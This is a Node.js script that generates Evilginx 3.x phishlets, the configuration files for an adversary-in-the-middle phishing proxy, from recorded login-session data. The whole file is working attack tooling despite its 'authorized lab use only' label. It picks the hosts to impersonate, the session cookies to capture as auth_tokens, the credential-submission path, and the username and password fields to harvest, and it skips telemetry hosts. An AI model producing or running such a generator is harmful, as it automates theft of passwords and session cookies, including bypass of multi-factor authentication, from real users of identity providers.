#!/usr/bin/env node

/**
 * Evilginx 3.x Phishlet Generator
 * Authorized lab use only
 * Generates capture-complete phishlet from session metadata
 */

const fs = require('fs');
const path = require('path');
const { parse } = require('url');

// Telemetry/CDN/analytics exclusion list
const DEFAULT_EXCLUDED_HOSTS = [
  'clarity.ms',
  'bing.com',
  'browser.events.data.microsoft.com',
  'google-analytics.com',
  'analytics.google.com',
  'doubleclick.net',
  'copilot.com',
  'copilot.microsoft.com',
  'skype.com',
  'skypeassets.com'
];

function isExcludedHost(host, customExclusions = []) {
  const allExclusions = [...DEFAULT_EXCLUDED_HOSTS, ...customExclusions];

  // Check exact match
  if (allExclusions.includes(host)) return true;

  // Check if host ends with excluded domain
  for (const excluded of allExclusions) {
    if (host === excluded || host.endsWith(`.${excluded}`)) return true;
  }

  // Check for MS telemetry patterns
  if (host.includes('onecollector') || host.match(/ms-sso\.copilot\./)) return true;

  return false;
}

function isTelemetryPath(urlString) {
  const url = new URL(urlString);
  const path = url.pathname.toLowerCase();

  // Telemetry path patterns
  if (path.includes('onecollector') ||
      path.includes('telemetry') ||
      path.includes('analytics') ||
      path.includes('tracking')) {
    return true;
  }

  return false;
}

function isStaticAsset(urlString) {
  const url = new URL(urlString);
  const path = url.pathname.toLowerCase();

  const staticExtensions = ['.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.woff', '.woff2', '.ttf', '.ico', '.webp'];

  for (const ext of staticExtensions) {
    if (path.endsWith(ext)) return true;
  }

  // Check for common static paths
  if (path.includes('/static/') || path.includes('/assets/') || path.includes('/images/') || path.includes('/fonts/')) {
    return true;
  }

  return false;
}

function isAuthUrl(urlString) {
  const url = new URL(urlString);
  const path = url.pathname.toLowerCase();

  const authPatterns = [
    'login', 'signin', 'auth', 'oauth', 'saml', 'authorize', 'token',
    'authenticate', 'credential', 'password', 'logon', 'sso', 'federation',
    'callback', 'redirect_uri', 'continue'
  ];

  for (const pattern of authPatterns) {
    if (path.includes(pattern)) return true;
  }

  return false;
}

function getRegistrableDomain(hostname) {
  // Simple PSL implementation for common TLDs
  const parts = hostname.split('.');

  if (parts.length <= 2) {
    return hostname;
  }

  // Handle common multi-part TLDs
  const multiPartTlds = ['co.uk', 'com.au', 'co.jp', 'com.br'];
  const lastTwo = parts.slice(-2).join('.');

  if (multiPartTlds.includes(lastTwo)) {
    return parts.slice(-3).join('.');
  }

  // Default: last two parts
  return parts.slice(-2).join('.');
}

function extractSubdomain(hostname, registrableDomain) {
  if (hostname === registrableDomain) {
    return 'www'; // Default subdomain
  }

  const prefix = hostname.replace('.' + registrableDomain, '');
  const parts = prefix.split('.');

  // Return only the first label (single DNS label)
  return parts[parts.length - 1] || 'www';
}

function detectSecretValue(value) {
  if (typeof value !== 'string') return false;

  // JWT pattern
  if (value.match(/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/)) {
    return true;
  }

  // Long random-looking tokens (but not UUIDs or timestamps)
  if (value.length > 32 && value.match(/^[A-Za-z0-9_\-\/+=]+$/) && !value.match(/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i)) {
    // Check entropy (simple heuristic)
    const uniqueChars = new Set(value).size;
    if (uniqueChars > value.length * 0.5) {
      return true;
    }
  }

  return false;
}

function generatePhishlet(sessionData, options = {}) {
  const { includeHosts = [], phishletName = 'lab-target' } = options;

  // Validate input structure
  if (!sessionData || !sessionData.events || !Array.isArray(sessionData.events)) {
    throw new Error('Invalid session data: missing events array');
  }

  // Check for secret values in event fields
  // NOTE: Do NOT scan input URL query parameters for secrets.
  // URL parameters in the captured session are observed metadata (URLs the
  // recorder saw), not credential material being emitted in the output.
  // Secret detection applies only to values that would appear in the
  // generated YAML (cookie values, credential values) — handled elsewhere.

  const events = sessionData.events;

  // Extract hosts from events
  const hostsData = new Map(); // host -> { setCookieNames: Set, isAuthRelevant: boolean }
  const authUrls = new Set();
  const observedOrigins = new Set();
  let primaryLoginHost = null;
  let primaryLoginPath = null;
  const credentialsData = { fields: [], formAction: null };

  for (const event of events) {
    const url = new URL(event.url);
    const host = url.hostname;
    const origin = event.origin || `${url.protocol}//${url.host}`;

    observedOrigins.add(origin);

    // Skip telemetry hosts unless explicitly included
    if (isExcludedHost(host) && !includeHosts.includes(host)) {
      continue;
    }

    // Skip telemetry paths
    if (isTelemetryPath(event.url)) {
      continue;
    }

    if (!hostsData.has(host)) {
      hostsData.set(host, { setCookieNames: new Set(), isAuthRelevant: false });
    }

    const hostData = hostsData.get(host);

    // Collect Set-Cookie names (support multiple field name spellings)
    const setCookieNames = event.set_cookie_names || event.setCookieNames || event.cookieNames || [];
    for (const cookieName of setCookieNames) {
      hostData.setCookieNames.add(cookieName);
    }

    // Mark as auth-relevant if auth URL or has cookies
    if (isAuthUrl(event.url) || setCookieNames.length > 0) {
      hostData.isAuthRelevant = true;
    }

    // Collect auth URLs (non-static)
    if (isAuthUrl(event.url) && !isStaticAsset(event.url)) {
      authUrls.add(url.pathname);

      // Determine primary login host and path
      // Prefer paths that look like credential submission (post, checkpassword, login)
      const pathScore = (path) => {
        let score = 0;
        if (/post/i.test(path)) score += 3;
        if (/checkpassword|password/i.test(path)) score += 3;
        if (/login/i.test(path)) score += 2;
        if (/authorize|oauth/i.test(path)) score += 1;
        return score;
      };
      const currentScore = pathScore(url.pathname);
      if (!primaryLoginHost || currentScore > pathScore(primaryLoginPath || '')) {
        primaryLoginHost = host;
        primaryLoginPath = url.pathname;
      }
    }

    // Extract form field metadata (R2f)
    if (event.form_fields && event.form_fields.length > 0) {
      for (const formData of event.form_fields) {
        if (formData.form_action) {
          const actionUrl = new URL(formData.form_action, event.url);
          const actionPath = actionUrl.pathname;
          // Prefer credential-submission endpoints over savestate/SSO completion
          const isCredentialEndpoint = /post|checkpassword|password|login/i.test(actionPath);
          if (!credentialsData.formAction || isCredentialEndpoint) {
            credentialsData.formAction = actionPath;
            credentialsData.formActionHost = actionUrl.hostname;
          }
        }

        for (const field of formData.fields) {
          // Username detection: match by type OR by exact name match (not substring)
          const isUsernameByType = ['email', 'text'].includes(field.type);
          const isUsernameByName = ['login', 'loginfmt', 'user', 'username', 'email', 'account'].includes(field.name.toLowerCase());

          if (field.type === 'password') {
            credentialsData.fields.push({
              key: field.name,
              search: '{{PLACEHOLDER}}',
              type: 'password'
            });
          } else if (isUsernameByType || isUsernameByName) {
            credentialsData.fields.push({
              key: field.name,
              search: '{{PLACEHOLDER}}',
              type: 'username'
            });
          }
        }
      }
    }
  }

  // Filter to auth-relevant hosts only
  const authRelevantHosts = Array.from(hostsData.entries())
    .filter(([host, data]) => data.isAuthRelevant)
    .map(([host, data]) => ({ host, data }));

  if (authRelevantHosts.length === 0) {
    throw new Error('No auth-relevant hosts found in session data');
  }

  // Group by registrable domain
  const domainGroups = new Map();
  for (const { host, data } of authRelevantHosts) {
    const domain = getRegistrableDomain(host);
    if (!domainGroups.has(domain)) {
      domainGroups.set(domain, []);
    }
    domainGroups.get(domain).push({ host, data });
  }

  // Build proxy_hosts
  const proxyHosts = [];
  for (const [domain, hosts] of domainGroups.entries()) {
    // Use the first host in this domain group
    const primaryHost = hosts[0].host;
    const hostData = hosts[0].data;

    const origSub = extractSubdomain(primaryHost, domain);
    const phishSub = origSub; // Same for lab
    const isLanding = primaryHost === primaryLoginHost;
    const hasSession = hostData.setCookieNames.size > 0;

    proxyHosts.push({
      phish_sub: phishSub,
      orig_sub: origSub,
      domain: domain,
      session: hasSession,
      is_landing: isLanding,
      auto_filter: true
    });
  }

  // Ensure exactly one landing host
  if (!proxyHosts.some(h => h.is_landing) && proxyHosts.length > 0) {
    proxyHosts[0].is_landing = true;
  }

  // Build auth_tokens (must be a list of {domain, keys})
  // Merge by registrable domain to avoid duplicates
  const authTokenMap = new Map();
  for (const { host, data } of authRelevantHosts) {
    if (data.setCookieNames.size > 0) {
      const domain = getRegistrableDomain(host);
      if (!authTokenMap.has(domain)) {
        authTokenMap.set(domain, new Set());
      }
      for (const cookie of data.setCookieNames) {
        authTokenMap.get(domain).add(cookie);
      }
    }
  }
  const authTokens = Array.from(authTokenMap.entries()).map(([domain, keys]) => ({
    domain: domain,
    keys: Array.from(keys)
  }));

  // Build credentials from captured form fields
  // Pick the single best username field (priority order) + single password field
  const usernameFields = credentialsData.fields.filter(f => f.type === 'username');
  const passwordFields = credentialsData.fields.filter(f => f.type === 'password');

  // Priority: loginfmt > login > user > username > email > account > first match
  const usernamePriority = ['loginfmt', 'login', 'user', 'username', 'email', 'account'];
  let bestUsername = null;
  for (const name of usernamePriority) {
    bestUsername = usernameFields.find(f => f.key.toLowerCase() === name);
    if (bestUsername) break;
  }
  if (!bestUsername && usernameFields.length > 0) {
    bestUsername = usernameFields[0];
  }

  const credentials = [];
  if (bestUsername) {
    credentials.push({ key: bestUsername.key, search: '{{PLACEHOLDER}}', type: 'username' });
  }
  if (passwordFields.length > 0) {
    credentials.push({ key: passwordFields[0].key, search: '{{PLACEHOLDER}}', type: 'password' });
  }

  // Build login object
  // Prefer the form_action's domain for login.domain when it's a credential endpoint
  // Otherwise fall back to the primary login host (the page where the login form lives)
  let loginDomain;
  if (credentialsData.formAction && credentialsData.formActionHost && /post|checkpassword|password|login/i.test(credentialsData.formAction)) {
    loginDomain = getRegistrableDomain(credentialsData.formActionHost);
  } else if (primaryLoginHost) {
    loginDomain = getRegistrableDomain(primaryLoginHost);
  } else {
    loginDomain = proxyHosts[0].domain;
  }
  let loginPath = primaryLoginPath || '/';

  // Prefer form action path when it's a credential submission endpoint
  if (credentialsData.formAction && /post|checkpassword|password|login/i.test(credentialsData.formAction)) {
    loginPath = credentialsData.formAction;
  }

  // Ensure login path is not a static asset
  if (isStaticAsset(`https://example.com${loginPath}`)) {
    loginPath = '/';
  }

  const login = {
    domain: loginDomain,
    path: loginPath
  };

  // Add username/password references if we captured them
  if (bestUsername) {
    login.username = bestUsername.key;
  }
  if (passwordFields.length > 0) {
    login.password = passwordFields[0].key;
  }

  // Build phishlet structure
  const phishlet = {
    name: phishletName,
    min_ver: '3.0.0',
    proxy_hosts: proxyHosts,
    auth_tokens: authTokens,
    auth_urls: Array.from(authUrls),
    login: login,
    credentials: credentials,
    sub_filters: ['{{PLACEHOLDER}}']
  };

  return phishlet;
}

function generateYaml(phishlet) {
  let yaml = `# Evilginx 3.x Phishlet\n`;
  yaml += `# Generated from lab capture - AUTHORIZED LAB USE ONLY\n`;
  yaml += `# Operator must complete: sub_filters (JS proxy-rewrite recipes)\n`;
  yaml += `# This is NOT a guaranteed working deployment against any live IdP\n\n`;

  yaml += `name: '${phishlet.name}'\n`;
  yaml += `min_ver: '${phishlet.min_ver}'\n\n`;

  yaml += `proxy_hosts:\n`;
  for (const host of phishlet.proxy_hosts) {
    yaml += `  - phish_sub: '${host.phish_sub}'\n`;
    yaml += `    orig_sub: '${host.orig_sub}'\n`;
    yaml += `    domain: '${host.domain}'\n`;
    yaml += `    session: ${host.session}\n`;
    yaml += `    is_landing: ${host.is_landing}\n`;
    yaml += `    auto_filter: ${host.auto_filter}\n`;
  }

  yaml += `\nauth_tokens:\n`;
  if (phishlet.auth_tokens.length === 0) {
    yaml += `  []\n`;
  } else {
    for (const token of phishlet.auth_tokens) {
      yaml += `  - domain: '${token.domain}'\n`;
      yaml += `    keys:\n`;
      for (const key of token.keys) {
        yaml += `      - '${key}'\n`;
      }
    }
  }

  yaml += `\nauth_urls:\n`;
  if (phishlet.auth_urls.length === 0) {
    yaml += `  []\n`;
  } else {
    for (const url of phishlet.auth_urls) {
      yaml += `  - '${url}'\n`;
    }
  }

  yaml += `\nlogin:\n`;
  yaml += `  domain: '${phishlet.login.domain}'\n`;
  yaml += `  path: '${phishlet.login.path}'\n`;
  if (phishlet.login.username) {
    yaml += `  username: '${phishlet.login.username}'\n`;
  }
  if (phishlet.login.password) {
    yaml += `  password: '${phishlet.login.password}'\n`;
  }

  yaml += `\ncredentials:\n`;
  if (phishlet.credentials.length === 0) {
    yaml += `  []\n`;
  } else {
    for (const cred of phishlet.credentials) {
      yaml += `  - key: '${cred.key}'\n`;
      yaml += `    search: '${cred.search}'\n`;
      yaml += `    type: '${cred.type}'\n`;
    }
  }

  yaml += `\nsub_filters:\n`;
  if (Array.isArray(phishlet.sub_filters)) {
    if (phishlet.sub_filters.length === 0) {
      yaml += `  []\n`;
    } else {
      for (const sf of phishlet.sub_filters) {
        yaml += `  - '${sf}'\n`;
      }
    }
  } else {
    yaml += `  - '${phishlet.sub_filters}'\n`;
  }

  return yaml;
}

function main() {
  const args = process.argv.slice(2);

  if (args.length === 0) {
    console.error('Usage: node phishlet-generator.js <session.json> [--name <phishlet-name>] [--include-host <host>] [--output <file.yaml>]');
    process.exit(1);
  }

  const inputFile = args[0];
  const options = {};
  let outputFile = null;

  for (let i = 1; i < args.length; i++) {
    if (args[i] === '--name' && args[i + 1]) {
      options.phishletName = args[i + 1];
      i++;
    } else if (args[i] === '--include-host' && args[i + 1]) {
      options.includeHosts = options.includeHosts || [];
      options.includeHosts.push(args[i + 1]);
      i++;
    } else if (args[i] === '--output' && args[i + 1]) {
      outputFile = args[i + 1];
      i++;
    }
  }

  try {
    const sessionJson = fs.readFileSync(inputFile, 'utf-8');
    const sessionData = JSON.parse(sessionJson);

    const phishlet = generatePhishlet(sessionData, options);
    const yaml = generateYaml(phishlet);

    if (outputFile) {
      fs.writeFileSync(outputFile, yaml);
      console.log(`✓ Phishlet written to ${outputFile}`);
    } else {
      console.log(yaml);
    }
  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = { generatePhishlet, generateYaml, isExcludedHost, DEFAULT_EXCLUDED_HOSTS };
